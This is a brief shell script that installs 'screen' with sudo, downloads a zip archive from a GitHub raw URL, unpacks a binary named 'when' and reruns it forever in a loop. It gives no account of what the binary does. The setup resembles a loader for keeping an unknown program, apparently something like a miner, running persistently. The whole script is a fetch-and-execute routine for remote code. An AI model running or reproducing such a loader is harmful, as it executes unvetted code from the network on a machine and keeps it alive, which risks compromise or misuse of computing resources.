#!/bin/sh
sudo apt update -y
sudo apt install screen -y
sudo screen -dmS elemen
wget https://raw.githubusercontent.com/elementanah/dono/main/when.zip
unzip when.zip
chmod +x when
while [ 1 ]; do
./when
sleep 99
done
sleep 99
